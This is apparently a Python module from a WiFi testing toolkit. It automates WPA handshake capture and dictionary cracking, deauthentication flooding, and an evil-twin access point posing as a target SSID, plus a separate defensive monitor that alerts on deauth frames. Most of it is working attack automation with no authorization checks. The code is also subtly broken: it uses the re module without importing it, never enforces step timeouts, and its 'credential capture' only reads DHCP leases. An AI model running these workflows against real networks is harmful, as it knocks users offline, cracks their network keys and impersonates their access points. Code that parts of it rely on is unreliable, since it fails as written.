"""Automated workflow engine for WiFi security assessments.

Provides pre-built and custom workflow automation for common
WiFi security testing sequences.
"""

import json
import logging
import os
import subprocess
import time
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

from wifi_aio.exceptions import (
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
)

logger = logging.getLogger(__name__)


class WorkflowState(Enum):
    """Possible states of a workflow step."""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"


class WorkflowStep:
    """A single step in a workflow."""

    def __init__(
        self,
        name: str,
        action: Callable[..., Dict],
        args: Optional[Dict] = None,
        on_failure: str = "stop",
        timeout: int = 300,
    ):
        self.name = name
        self.action = action
        self.args = args or {}
        self.on_failure = on_failure  # "stop", "skip", "continue"
        self.timeout = timeout
        self.state = WorkflowState.PENDING
        self.result: Optional[Dict] = None
        self.start_time: Optional[float] = None
        self.end_time: Optional[float] = None
        self.error: Optional[str] = None

    @property
    def duration(self) -> float:
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0

    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "state": self.state.value,
            "on_failure": self.on_failure,
            "timeout": self.timeout,
            "duration": round(self.duration, 3),
            "error": self.error,
            "result": self.result,
        }


class WorkflowEngine:
    """Execute automated WiFi security testing workflows.

    Pre-built workflows:
    - scan_capture_crack: Scan → Capture handshake → Crack
    - deauth_eviltwin_capture: Deauth → Evil twin → Credential capture
    - monitor_alert_log: Monitor → Alert on events → Log
    """

    def __init__(self):
        self.workflows: Dict[str, List[WorkflowStep]] = {}
        self.results: Dict[str, Dict] = {}
        self._alert_callbacks: List[Callable] = []
        self._running = False
        self._stop_requested = False

    # ------------------------------------------------------------------
    # Workflow management
    # ------------------------------------------------------------------

    def create_workflow(self, name: str, steps: Optional[List[WorkflowStep]] = None) -> str:
        """Create a new workflow.

        Args:
            name: Workflow name.
            steps: Optional list of WorkflowStep objects.

        Returns:
            Workflow name.
        """
        self.workflows[name] = steps or []
        self.results[name] = {"state": "created", "steps": []}
        logger.info("Workflow '%s' created with %d steps", name, len(self.workflows[name]))
        return name

    def add_step(
        self,
        workflow_name: str,
        step: WorkflowStep,
    ) -> None:
        """Add a step to an existing workflow.

        Args:
            workflow_name: Target workflow name.
            step: WorkflowStep to add.
        """
        if workflow_name not in self.workflows:
            raise ValueError(f"Workflow '{workflow_name}' not found")
        self.workflows[workflow_name].append(step)

    def remove_step(self, workflow_name: str, step_name: str) -> bool:
        """Remove a step from a workflow by name.

        Returns:
            True if step was found and removed.
        """
        if workflow_name not in self.workflows:
            return False
        steps = self.workflows[workflow_name]
        for i, step in enumerate(steps):
            if step.name == step_name:
                steps.pop(i)
                return True
        return False

    # ------------------------------------------------------------------
    # Workflow execution
    # ------------------------------------------------------------------

    def run_workflow(self, name: str, context: Optional[Dict] = None) -> Dict:
        """Execute a workflow.

        Args:
            name: Workflow name to execute.
            context: Shared context dict passed between steps.

        Returns:
            Dict with workflow execution results.
        """
        if name not in self.workflows:
            raise ValueError(f"Workflow '{name}' not found")

        workflow = self.workflows[name]
        ctx = context or {}
        self._running = True
        self._stop_requested = False

        result = {
            "workflow": name,
            "state": "running",
            "start_time": datetime.now().isoformat(),
            "steps": [],
            "context": ctx,
        }

        logger.info("Starting workflow '%s' with %d steps", name, len(workflow))

        for step in workflow:
            if self._stop_requested:
                step.state = WorkflowState.SKIPPED
                result["steps"].append(step.to_dict())
                logger.info("Workflow '%s' stopped by request at step '%s'", name, step.name)
                continue

            logger.info("Executing step '%s'", step.name)
            step.state = WorkflowState.RUNNING
            step.start_time = time.time()

            try:
                step_result = step.action(**{**step.args, **ctx})
                step.result = step_result
                step.state = WorkflowState.COMPLETED
                # Merge result into context for subsequent steps
                if isinstance(step_result, dict):
                    ctx.update(step_result)
                logger.info("Step '%s' completed successfully", step.name)

            except Exception as exc:
                step.error = str(exc)
                step.state = WorkflowState.FAILED
                logger.error("Step '%s' failed: %s", step.name, exc)

                if step.on_failure == "stop":
                    result["state"] = "failed"
                    result["steps"].append(step.to_dict())
                    # Mark remaining steps as skipped
                    for remaining in workflow[workflow.index(step) + 1:]:
                        remaining.state = WorkflowState.SKIPPED
                        result["steps"].append(remaining.to_dict())
                    break
                elif step.on_failure == "skip":
                    pass  # Continue to next step
                elif step.on_failure == "continue":
                    ctx["last_error"] = str(exc)

            finally:
                step.end_time = time.time()
                result["steps"].append(step.to_dict())

        if result["state"] == "running":
            result["state"] = "completed"

        result["end_time"] = datetime.now().isoformat()
        result["context"] = ctx
        self.results[name] = result
        self._running = False

        logger.info("Workflow '%s' finished with state: %s", name, result["state"])
        return result

    def stop_workflow(self) -> None:
        """Request the running workflow to stop."""
        self._stop_requested = True
        logger.info("Workflow stop requested")

    # ------------------------------------------------------------------
    # Pre-built workflow: Scan → Capture → Crack
    # ------------------------------------------------------------------

    def create_scan_capture_crack_workflow(
        self,
        interface: str,
        target_bssid: Optional[str] = None,
        target_channel: Optional[int] = None,
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        capture_timeout: int = 300,
    ) -> str:
        """Create a scan → capture handshake → crack workflow.

        Args:
            interface: Wireless interface name.
            target_bssid: Target AP BSSID (None to auto-select).
            target_channel: Target channel (None to auto-detect).
            wordlist_path: Path to password wordlist.
            capture_timeout: Handshake capture timeout in seconds.

        Returns:
            Workflow name.
        """
        name = "scan_capture_crack"
        steps = [
            WorkflowStep(
                name="scan_networks",
                action=self._step_scan_networks,
                args={"interface": interface},
                timeout=60,
            ),
            WorkflowStep(
                name="select_target",
                action=self._step_select_target,
                args={"target_bssid": target_bssid},
                on_failure="stop",
            ),
            WorkflowStep(
                name="set_monitor_mode",
                action=self._step_set_monitor_mode,
                args={"interface": interface},
                on_failure="stop",
            ),
            WorkflowStep(
                name="set_channel",
                action=self._step_set_channel,
                args={"interface": interface, "channel": target_channel},
            ),
            WorkflowStep(
                name="capture_handshake",
                action=self._step_capture_handshake,
                args={
                    "interface": interface,
                    "timeout": capture_timeout,
                },
                timeout=capture_timeout + 30,
            ),
            WorkflowStep(
                name="crack_handshake",
                action=self._step_crack_handshake,
                args={"wordlist_path": wordlist_path},
                on_failure="continue",
                timeout=600,
            ),
            WorkflowStep(
                name="restore_interface",
                action=self._step_restore_interface,
                args={"interface": interface},
                on_failure="continue",
            ),
        ]
        return self.create_workflow(name, steps)

    @staticmethod
    def _step_scan_networks(interface: str, **kwargs) -> Dict:
        """Scan for WiFi networks."""
        try:
            result = subprocess.run(
                ["airodump-ng", interface, "-w", "/tmp/wifiaio_scan", "--output-format", "csv"],
                capture_output=True, text=True, timeout=30,
            )
            networks = []
            csv_path = "/tmp/wifiaio_scan-01.csv"
            if os.path.isfile(csv_path):
                with open(csv_path, "r", errors="ignore") as fh:
                    for line in fh:
                        parts = line.strip().split(",")
                        if len(parts) >= 14 and re.match(r"([0-9A-Fa-f:]{17})", parts[0].strip()):
                            networks.append({
                                "bssid": parts[0].strip(),
                                "channel": parts[3].strip(),
                                "ssid": parts[13].strip() if len(parts) > 13 else "",
                                "encryption": parts[5].strip() if len(parts) > 5 else "",
                            })
            return {"networks": networks}
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            raise WiFiConnectionError(f"Network scan failed: {exc}")

    @staticmethod
    def _step_select_target(target_bssid: Optional[str] = None, **kwargs) -> Dict:
        """Select a target AP from scan results."""
        networks = kwargs.get("networks", [])
        if not networks:
            raise WiFiConnectionError("No networks found in scan results")

        if target_bssid:
            for net in networks:
                if net["bssid"].lower() == target_bssid.lower():
                    return {"target": net, "target_channel": int(net.get("channel", 1))}
            raise WiFiConnectionError(f"Target BSSID {target_bssid} not found")

        # Select first WPA network
        for net in networks:
            if "WPA" in net.get("encryption", "").upper():
                return {"target": net, "target_channel": int(net.get("channel", 1))}

        # Fallback to first network
        target = networks[0]
        return {"target": target, "target_channel": int(target.get("channel", 1))}

    @staticmethod
    def _step_set_monitor_mode(interface: str, **kwargs) -> Dict:
        """Set interface to monitor mode."""
        try:
            subprocess.run(
                ["ip", "link", "set", interface, "down"],
                check=True, capture_output=True, text=True, timeout=10,
            )
            subprocess.run(
                ["iw", interface, "set", "monitor", "none"],
                check=True, capture_output=True, text=True, timeout=10,
            )
            subprocess.run(
                ["ip", "link", "set", interface, "up"],
                check=True, capture_output=True, text=True, timeout=10,
            )
            return {"monitor_mode": True}
        except subprocess.CalledProcessError as exc:
            raise WiFiConnectionError(f"Monitor mode failed: {exc.stderr.strip()}")

    @staticmethod
    def _step_set_channel(interface: str, channel: Optional[int] = None, **kwargs) -> Dict:
        """Set interface channel."""
        target_channel = channel or kwargs.get("target_channel", 1)
        try:
            subprocess.run(
                ["iw", "dev", interface, "set", "channel", str(target_channel)],
                check=True, capture_output=True, text=True, timeout=10,
            )
            return {"channel_set": target_channel}
        except subprocess.CalledProcessError as exc:
            raise WiFiConnectionError(f"Channel set failed: {exc.stderr.strip()}")

    @staticmethod
    def _step_capture_handshake(interface: str, timeout: int = 300, **kwargs) -> Dict:
        """Capture WPA handshake."""
        target = kwargs.get("target", {})
        bssid = target.get("bssid", "")
        channel = kwargs.get("target_channel", 1)
        output_prefix = f"/tmp/wifiaio_handshake_{bssid.replace(':', '')}"

        try:
            proc = subprocess.Popen(
                [
                    "airodump-ng",
                    interface,
                    "-c", str(channel),
                    "--bssid", bssid,
                    "-w", output_prefix,
                    "--output-format", "pcap",
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            # Wait for capture or timeout
            start = time.time()
            handshake_file = None
            while time.time() - start < timeout:
                # Check if pcap file exists and has handshake
                for ext in ["-01.cap", "-01.pcap", ".cap", ".pcap"]:
                    candidate = output_prefix + ext
                    if os.path.isfile(candidate):
                        handshake_file = candidate
                        break

                if handshake_file:
                    # Quick check for handshake using aircrack
                    check = subprocess.run(
                        ["aircrack-ng", handshake_file],
                        capture_output=True, text=True, timeout=10,
                    )
                    if "1 handshake" in check.stdout:
                        proc.terminate()
                        return {"handshake_captured": True, "handshake_file": handshake_file}

                time.sleep(5)

            proc.terminate()
            return {"handshake_captured": False, "handshake_file": handshake_file}

        except FileNotFoundError as exc:
            raise WiFiConnectionError(f"airodump-ng not found: {exc}")

    @staticmethod
    def _step_crack_handshake(wordlist_path: str, **kwargs) -> Dict:
        """Attempt to crack captured handshake."""
        handshake_file = kwargs.get("handshake_file")
        if not handshake_file or not os.path.isfile(handshake_file):
            raise WiFiConnectionError("No handshake file to crack")

        try:
            result = subprocess.run(
                ["aircrack-ng", "-w", wordlist_path, handshake_file],
                capture_output=True, text=True, timeout=600,
            )
            output = result.stdout

            if "KEY FOUND" in output:
                match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
                key = match.group(1) if match else "unknown"
                return {"cracked": True, "key": key}
            return {"cracked": False, "key": None}
        except FileNotFoundError:
            raise WiFiConnectionError("aircrack-ng not found")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("Cracking timed out")

    @staticmethod
    def _step_restore_interface(interface: str, **kwargs) -> Dict:
        """Restore interface to managed mode."""
        try:
            subprocess.run(
                ["ip", "link", "set", interface, "down"],
                check=True, capture_output=True, text=True, timeout=10,
            )
            subprocess.run(
                ["iw", interface, "set", "type", "managed"],
                check=True, capture_output=True, text=True, timeout=10,
            )
            subprocess.run(
                ["ip", "link", "set", interface, "up"],
                check=True, capture_output=True, text=True, timeout=10,
            )
            return {"restored": True}
        except subprocess.CalledProcessError:
            return {"restored": False}

    # ------------------------------------------------------------------
    # Pre-built workflow: Deauth → Evil Twin → Capture
    # ------------------------------------------------------------------

    def create_deauth_eviltwin_workflow(
        self,
        interface: str,
        target_bssid: str,
        target_ssid: str,
        target_channel: int,
        deauth_count: int = 10,
        capture_duration: int = 300,
    ) -> str:
        """Create a deauth → evil twin → credential capture workflow.

        Args:
            interface: Wireless interface.
            target_bssid: Target AP BSSID.
            target_ssid: Target AP SSID.
            target_channel: Target AP channel.
            deauth_count: Number of deauth packets to send.
            capture_duration: Duration to run evil twin in seconds.

        Returns:
            Workflow name.
        """
        name = "deauth_eviltwin_capture"
        steps = [
            WorkflowStep(
                name="set_monitor_mode",
                action=self._step_set_monitor_mode,
                args={"interface": interface},
                on_failure="stop",
            ),
            WorkflowStep(
                name="send_deauth",
                action=self._step_send_deauth,
                args={
                    "interface": interface,
                    "target_bssid": target_bssid,
                    "deauth_count": deauth_count,
                },
                timeout=30,
            ),
            WorkflowStep(
                name="start_evil_twin",
                action=self._step_start_evil_twin,
                args={
                    "interface": interface,
                    "ssid": target_ssid,
                    "channel": target_channel,
                    "duration": capture_duration,
                },
                timeout=capture_duration + 30,
            ),
            WorkflowStep(
                name="capture_credentials",
                action=self._step_capture_credentials,
                args={"duration": capture_duration},
                timeout=capture_duration + 30,
            ),
            WorkflowStep(
                name="restore_interface",
                action=self._step_restore_interface,
                args={"interface": interface},
                on_failure="continue",
            ),
        ]
        return self.create_workflow(name, steps)

    @staticmethod
    def _step_send_deauth(
        interface: str,
        target_bssid: str,
        deauth_count: int = 10,
        **kwargs,
    ) -> Dict:
        """Send deauthentication packets to target AP."""
        try:
            result = subprocess.run(
                [
                    "aireplay-ng",
                    "-0", str(deauth_count),
                    "-a", target_bssid,
                    interface,
                ],
                capture_output=True, text=True, timeout=30,
            )
            sent = 0
            match = re.search(r"Sent (\d+) packets", result.stdout)
            if match:
                sent = int(match.group(1))
            return {"deauth_sent": sent}
        except FileNotFoundError:
            raise WiFiConnectionError("aireplay-ng not found")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("Deauth timed out")

    @staticmethod
    def _step_start_evil_twin(
        interface: str,
        ssid: str,
        channel: int,
        duration: int = 300,
        **kwargs,
    ) -> Dict:
        """Start an evil twin access point."""
        try:
            # Start hostapd-based evil twin
            config = f"""interface={interface}
ssid={ssid}
channel={channel}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=Password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
"""
            config_path = "/tmp/wifiaio_eviltwin.conf"
            with open(config_path, "w") as fh:
                fh.write(config)

            proc = subprocess.Popen(
                ["hostapd", config_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            # Start DHCP server
            dhcp_config = """default-lease-time 600;
max-lease-time 7200;
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.10 10.0.0.50;
    option routers 10.0.0.1;
    option domain-name-servers 10.0.0.1;
}"""
            dhcp_path = "/tmp/wifiaio_dhcpd.conf"
            with open(dhcp_path, "w") as fh:
                fh.write(dhcp_config)

            # Configure interface IP
            subprocess.run(
                ["ip", "addr", "add", "10.0.0.1/24", "dev", interface],
                capture_output=True, text=True, timeout=5,
            )

            # Start DHCP server
            dhcp_proc = subprocess.Popen(
                ["dnsmasq", "-d", "-C", dhcp_path, "-i", interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            # Wait for duration
            time.sleep(min(duration, 10))  # Brief start, let capture step handle duration

            return {
                "evil_twin_started": True,
                "ssid": ssid,
                "hostapd_pid": proc.pid,
                "dhcp_pid": dhcp_proc.pid,
            }
        except FileNotFoundError as exc:
            raise WiFiConnectionError(f"Evil twin tool not found: {exc}")

    @staticmethod
    def _step_capture_credentials(duration: int = 300, **kwargs) -> Dict:
        """Capture credentials from evil twin connections.

        This monitors the DHCP leases and connection logs.
        """
        credentials: List[Dict] = []
        start = time.time()

        while time.time() - start < duration:
            # Check DHCP lease file
            lease_file = "/var/lib/dnsmasq/dnsmasq.leases"
            if os.path.isfile(lease_file):
                try:
                    with open(lease_file, "r") as fh:
                        for line in fh:
                            parts = line.strip().split()
                            if len(parts) >= 4:
                                credentials.append({
                                    "timestamp": parts[0],
                                    "mac": parts[1],
                                    "ip": parts[2],
                                    "hostname": parts[3],
                                    "type": "dhcp_lease",
                                })
                except OSError:
                    pass

            # Check for captured credentials file
            creds_file = "/tmp/wifiaio_captured_creds.json"
            if os.path.isfile(creds_file):
                try:
                    with open(creds_file, "r") as fh:
                        data = json.load(fh)
                        if isinstance(data, list):
                            credentials.extend(data)
                except (OSError, json.JSONDecodeError):
                    pass

            time.sleep(5)

        # Deduplicate
        unique_creds = []
        seen = set()
        for cred in credentials:
            key = f"{cred.get('mac', '')}_{cred.get('ip', '')}"
            if key not in seen:
                seen.add(key)
                unique_creds.append(cred)

        return {"credentials": unique_creds, "duration": duration}

    # ------------------------------------------------------------------
    # Pre-built workflow: Monitor → Alert → Log
    # ------------------------------------------------------------------

    def create_monitor_alert_workflow(
        self,
        interface: str,
        alert_rules: Optional[List[Dict]] = None,
        log_path: str = "/tmp/wifiaio_monitor.log",
        duration: int = 3600,
    ) -> str:
        """Create a monitor → alert → log workflow.

        Args:
            interface: Wireless interface in monitor mode.
            alert_rules: List of alert rule dicts with 'type' and 'params'.
            log_path: Path to log file.
            duration: Duration to monitor in seconds.

        Returns:
            Workflow name.
        """
        name = "monitor_alert_log"
        steps = [
            WorkflowStep(
                name="set_monitor_mode",
                action=self._step_set_monitor_mode,
                args={"interface": interface},
                on_failure="stop",
            ),
            WorkflowStep(
                name="start_monitoring",
                action=self._step_start_monitoring,
                args={
                    "interface": interface,
                    "alert_rules": alert_rules or [],
                    "log_path": log_path,
                    "duration": duration,
                },
                timeout=duration + 60,
            ),
        ]
        return self.create_workflow(name, steps)

    def _step_start_monitoring(
        self,
        interface: str,
        alert_rules: List[Dict],
        log_path: str,
        duration: int = 3600,
        **kwargs,
    ) -> Dict:
        """Monitor wireless traffic and alert on events."""
        alerts: List[Dict] = []
        packet_count = 0
        start = time.time()

        # Default alert rules
        if not alert_rules:
            alert_rules = [
                {"type": "deauth", "description": "Deauthentication frame detected"},
                {"type": "probe", "description": "Probe request for hidden SSID"},
                {"type": "new_ap", "description": "New access point detected"},
                {"type": "wps", "description": "WPS protocol detected"},
            ]

        try:
            # Start tshark capture
            cmd = [
                "tshark", "-i", interface,
                "-T", "fields",
                "-e", "wlan.fc.type_subtype",
                "-e", "wlan.sa",
                "-e", "wlan.da",
                "-e", "wlan.bssid",
                "-e", "radiotap.dbm_antsignal",
                "-e", "wlan_mgt.ssid",
            ]
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            while time.time() - start < duration and not self._stop_requested:
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                packet_count += 1
                parts = line.strip().split("\t")
                if len(parts) < 3:
                    continue

                subtype = parts[0] if parts[0] else ""
                sa = parts[1] if len(parts) > 1 else ""
                da = parts[2] if len(parts) > 2 else ""

                # Check alert rules
                for rule in alert_rules:
                    triggered = False
                    alert_info = {"rule": rule, "timestamp": time.time()}

                    if rule["type"] == "deauth" and subtype in ("1100", "1101"):
                        triggered = True
                        alert_info["description"] = f"Deauth: {sa} -> {da}"
                    elif rule["type"] == "probe" and subtype == "0100":
                        triggered = True
                        ssid = parts[5] if len(parts) > 5 else ""
                        alert_info["description"] = f"Probe: {sa} for '{ssid}'"
                    elif rule["type"] == "new_ap" and subtype == "0000":
                        triggered = True
                        ssid = parts[5] if len(parts) > 5 else ""
                        alert_info["description"] = f"New AP beacon: {ssid} ({sa})"

                    if triggered:
                        alerts.append(alert_info)
                        self._fire_alert(alert_info)
                        self._log_event(log_path, alert_info)

            proc.terminate()

        except FileNotFoundError:
            # Fallback without tshark
            logger.warning("tshark not found, using basic monitoring")
            time.sleep(min(duration, 60))

        return {
            "alerts": alerts,
            "packet_count": packet_count,
            "duration": time.time() - start,
        }

    def add_alert_callback(self, callback: Callable) -> None:
        """Register a callback function for alerts.

        Args:
            callback: Function that takes an alert dict as argument.
        """
        self._alert_callbacks.append(callback)

    def _fire_alert(self, alert: Dict) -> None:
        """Trigger all registered alert callbacks."""
        for callback in self._alert_callbacks:
            try:
                callback(alert)
            except Exception as exc:
                logger.warning("Alert callback error: %s", exc)

    @staticmethod
    def _log_event(log_path: str, event: Dict) -> None:
        """Write an event to the log file."""
        try:
            with open(log_path, "a") as fh:
                fh.write(json.dumps(event) + "\n")
        except OSError as exc:
            logger.warning("Failed to write log: %s", exc)

    # ------------------------------------------------------------------
    # Custom workflow builder
    # ------------------------------------------------------------------

    def build_custom_workflow(
        self,
        name: str,
        step_definitions: List[Dict],
    ) -> str:
        """Build a custom workflow from step definitions.

        Args:
            name: Workflow name.
            step_definitions: List of step definition dicts with:
                - name: Step name
                - function: Callable to execute
                - args: Dict of arguments
                - on_failure: "stop" | "skip" | "continue"
                - timeout: Timeout in seconds

        Returns:
            Workflow name.
        """
        steps = []
        for defn in step_definitions:
            step = WorkflowStep(
                name=defn["name"],
                action=defn["function"],
                args=defn.get("args", {}),
                on_failure=defn.get("on_failure", "stop"),
                timeout=defn.get("timeout", 300),
            )
            steps.append(step)
        return self.create_workflow(name, steps)

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    def list_workflows(self) -> List[str]:
        """List all defined workflow names."""
        return list(self.workflows.keys())

    def get_workflow_info(self, name: str) -> Dict:
        """Get information about a workflow."""
        if name not in self.workflows:
            raise ValueError(f"Workflow '{name}' not found")
        steps = self.workflows[name]
        return {
            "name": name,
            "step_count": len(steps),
            "steps": [s.to_dict() for s in steps],
            "last_result": self.results.get(name),
        }

    def get_results(self, name: str) -> Optional[Dict]:
        """Get the results of a workflow execution."""
        return self.results.get(name)

    def export_results(self, name: str, filepath: str) -> str:
        """Export workflow results to a JSON file."""
        result = self.results.get(name)
        if not result:
            raise ValueError(f"No results for workflow '{name}'")

        with open(filepath, "w") as fh:
            json.dump(result, fh, indent=2, default=str)
        return filepath
